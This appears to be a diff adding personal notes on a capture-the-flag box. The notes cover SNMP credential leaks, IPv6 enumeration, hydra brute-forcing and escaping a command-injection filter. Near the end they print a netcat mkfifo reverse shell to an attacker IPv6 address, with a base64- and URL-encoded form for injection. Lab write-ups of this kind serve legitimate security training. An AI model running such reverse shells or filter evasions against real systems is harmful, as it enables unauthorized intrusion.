@@ -1,0 +1,79 @@
+(love this box, super hard, learnt about IPv6)
+Hint:
+- in snmp enum, there is an entry about IPv6 address.
+- sometimes one of the user and password is wrong. Don't assume it is password.
+- I had some issue about trying hydra for ipv6. Edit /etc/hosts to solve the problem.
+- escape cmd filter by '\l\s' or '/usr/bin/fin?' (to run find). Guess what the expression is on server.
+- ipv4 rev shell failed. Try ipv6. Remember to add '-6' on both sides
+    - also use base64 to make sure there is no error cause by encoding
+
+New Tool:
+- https://github.com/trickster0/Enyx => snmp IPv6 enum
+    - or apt install snmp-mibs-downloader and edit /etc/snmp/snmp.conf and comment out everything(one line), then the snmptwalk gives names instead of numbers
+- getfact <file> => see extended acl
+
+Logs:
+# init contatct
+nmap all tcp =>
+22 - ssh
+3366 - Radicale calendar and contacts server (Python BaseHTTPServer)
+
+nmap common udp =>
+161/udp snmp
+
+snmp-check and snmpwalk give me an interesting command line:
+python -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
+and
+/home/loki/hosted/webstart.sh
+
+so the user:pass is loki:godofmischiefisloki
+
+# login to 3366
+use a browser and login.
+on the web, it shows another cred: loki:trickeryanddeceit
+ssh with it failed. So we have to use it elsewhere.
+
+# ipv6 info
+(read the walkthrough), use Enyx => ipv6 info
+[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb2:3af1 (this changes)
+[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb2:3af1
+
+# nmap -6
+use unique-local ipv6 with nmap -6, get different result
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+# ipv6 http
+80 => need login
+gobuster => nothing interesting
+hydra => administrator:trickeryanddeceit
+
+command execution panel
+tried `,;,|,\, and the backend should be "A && echo success || echo failed"
+so just enter "which \n\c; true"
+read the database.php:
+$username = 'debian-sys-maint';
+$password = 'nE1S9Aw1L0Ky3Y9h';
+$database = 'dbpanel';
+
+read /home/loki/credentials => pass: lokiisthebestnorsegod
+ssh in, ok
+
+# priv esc
+check mysql, nothing interesting.
+find another http login cred, loki:lokipasswordmischieftrickery
+
+(rest are from ippsec video)
+generate: echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -6 dead:beef:2::xxxx 8888 >/tmp/f' | base64 -w 0
+in burp: echo+-n+'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8bmMgLTYgZGVhZDpiZWVmOjI6OjEwMTEgODg4OCA%2bL3RtcC9m'+|+base64+-d+|+sh%3
+nc -lnvp -6 8888
+
+then use lokipasswordmischieftrickery as password to root
+
+
+total user:pass are
+loki:godofmischiefisloki
+loki:trickeryanddeceit
+debian-sys-maint:nE1S9Aw1L0Ky3Y9h
+loki:lokiisthebestnorsegod
+loke:lokipasswordmischieftrickery
